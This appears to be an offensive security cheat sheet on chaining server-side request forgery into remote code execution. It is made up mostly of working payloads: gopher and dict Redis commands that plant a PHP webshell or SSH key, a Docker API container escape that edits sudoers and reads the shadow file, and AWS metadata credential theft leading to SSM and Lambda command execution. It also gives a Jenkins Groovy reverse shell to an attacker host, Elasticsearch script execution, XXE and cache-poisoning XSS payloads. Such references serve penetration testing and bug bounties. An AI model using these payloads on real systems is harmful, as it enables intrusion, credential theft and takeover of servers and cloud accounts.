---
tags:
  - critical
---

# SSRF → RCE

From making server requests to executing code.

## Overview

```
SSRF → Internal Service → Exploit → RCE
           ↓
       Redis/Memcached   → Webshell / SSH key
       Docker API        → Container escape
       Cloud metadata    → IAM creds → RCE
       FastCGI           → PHP execution
       Jenkins           → Groovy console
```

---

## Chain 1: SSRF → Redis → RCE

**Requirements:** Redis on 6379, no auth, write access to web/ssh dir

### Via Gopher (Webshell)

```bash
# Generate with Gopherus
python gopherus.py --exploit redis

# Manual payload
gopher://127.0.0.1:6379/_*3%0D%0A$3%0D%0ASET%0D%0A$5%0D%0Ashell%0D%0A$31%0D%0A<?php system($_GET['cmd']); ?>%0D%0A*4%0D%0A$6%0D%0ACONFIG%0D%0A$3%0D%0ASET%0D%0A$3%0D%0Adir%0D%0A$13%0D%0A/var/www/html%0D%0A*4%0D%0A$6%0D%0ACONFIG%0D%0A$3%0D%0ASET%0D%0A$10%0D%0Adbfilename%0D%0A$9%0D%0Ashell.php%0D%0A*1%0D%0A$4%0D%0ASAVE%0D%0A
```

### Via Dict Protocol

```bash
dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20shell.php
dict://127.0.0.1:6379/SET%20x%20"<?php system($_GET['cmd']); ?>"
dict://127.0.0.1:6379/SAVE
```

### SSH Key Injection

```bash
gopher://127.0.0.1:6379/_CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET x "\n\nssh-rsa AAAA... attacker@host\n\n"
SAVE
```

---

## Chain 2: SSRF → Docker API → RCE

**Requirements:** Docker API on 2375/2376, no TLS auth

```bash
# List containers
GET http://127.0.0.1:2375/containers/json

# Create privileged container with host mount
POST http://127.0.0.1:2375/containers/create
Content-Type: application/json

{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /mnt/etc/sudoers"],
  "Binds": ["/:/mnt"],
  "Privileged": true
}

# Start container
POST http://127.0.0.1:2375/containers/{id}/start

# Execute command
POST http://127.0.0.1:2375/containers/{id}/exec
{"Cmd": ["cat", "/mnt/etc/shadow"]}
```

---

## Chain 3: SSRF → FastCGI → RCE

**Requirements:** PHP-FPM on 9000, known PHP file path

```bash
# Generate with Gopherus
python gopherus.py --exploit fastcgi

# Enter PHP file: /var/www/html/index.php
# Enter command: id
# Get gopher URL
```

---

## Chain 4: SSRF → AWS Metadata → RCE

**Requirements:** EC2 with IAM role, IMDSv1 enabled

### Step 1: Get Credentials

```bash
# Get role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Returns:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "..."
}
```

### Step 2: Use Credentials for RCE

```bash
# Configure AWS CLI
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Check permissions
aws sts get-caller-identity

# Lambda RCE
aws lambda list-functions
aws lambda invoke --function-name X output.txt

# EC2 SSM RCE
aws ssm send-command --instance-ids i-xxx \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["whoami"]'

# S3 secrets
aws s3 ls
aws s3 cp s3://bucket/secrets.env .
```

### IMDSv2 Bypass

```bash
# Needs token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

---

## Chain 5: SSRF → Jenkins → RCE

**Requirements:** Jenkins on 8080 with script console enabled

```bash
# Access script console
GET http://127.0.0.1:8080/script

# Execute Groovy
POST http://127.0.0.1:8080/script
script=println "whoami".execute().text

# Reverse shell
POST http://127.0.0.1:8080/script
script=["bash","-c","bash -i >& /dev/tcp/attacker/4444 0>&1"].execute()
```

---

## Chain 6: SSRF → Memcached → Session Injection

**Requirements:** Memcached on 11211, app uses memcached sessions

```bash
# Inject serialized session
dict://127.0.0.1:11211/set session:admin 0 3600 [length]
[serialized_object]

# Or cache poisoning for XSS
dict://127.0.0.1:11211/set cached_page 0 3600 50
<script>alert(document.cookie)</script>
```

---

## Chain 7: XXE → SSRF → RCE

**Combine XXE with SSRF bypass techniques**

```xml
<!-- XXE to metadata -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
<foo>&xxe;</foo>

<!-- XXE to Redis via gopher -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO">]>

<!-- XXE with IP bypass -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://2130706433/">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1.nip.io/">]>
```

---

## Chain 8: SSRF → Internal Git → Source Code → RCE

```bash
# GitLab/GitHub Enterprise
http://127.0.0.1:3000/api/v4/projects
http://127.0.0.1:3000/user/repo/raw/master/.env

# Find secrets in source → Use for RCE
# - Database creds → SQLi → RCE
# - API keys → Cloud access
# - SSH keys → Direct access
```

---

## Chain 9: SSRF → Kubernetes → RCE

```bash
# Kubelet API
http://127.0.0.1:10250/pods
http://127.0.0.1:10250/run/{namespace}/{pod}/{container}

# etcd (cluster secrets)
http://127.0.0.1:2379/v2/keys/

# Kubernetes API
http://127.0.0.1:8443/api/v1/namespaces/default/secrets
```

---

## Chain 10: SSRF → Elasticsearch → Data + RCE

```bash
# Data exfil
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/_search?q=password
http://127.0.0.1:9200/users/_search

# RCE (old versions)
POST http://127.0.0.1:9200/_search
{"script_fields":{"exp":{"script":"Runtime.getRuntime().exec('id')"}}}
```

---

## SSRF → Cloud Metadata → OAuth Token Forge

**From synthesis: SSRF bypass → metadata → IAM with OAuth permissions**

```bash
# 1. SSRF to metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2. IAM role has secrets manager access
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id oauth-client-secret

# 3. Forge OAuth tokens with stolen client secret
```

---

## Impact Table

| SSRF Target | Chain | Impact |
|-------------|-------|--------|
| Blind SSRF | → DNS exfil | Low |
| Read internal | → Source code | Medium |
| Redis | → Webshell | Critical |
| Docker API | → Host escape | Critical |
| AWS metadata | → Cloud takeover | Critical |
| Jenkins | → CI/CD RCE | Critical |
| Kubernetes | → Cluster takeover | Critical |

---

## PoC Template

```markdown
## Summary
SSRF in [endpoint] chains to RCE via [internal service].

## Chain
1. SSRF allows requests to internal network
2. [Service] accessible on [port]
3. Using [protocol/technique], RCE achieved

## Steps
1. Send SSRF payload: `[URL]`
2. Access internal service: `[command]`
3. Execute code: `[payload]`

## Impact
Full server compromise via SSRF → [Service] → RCE.

CVSS: 9.8 (Critical)
```

---
*Related: [XSS to ATO](xss-to-ato.md) | [OAuth to ATO](oauth-to-ato.md)*
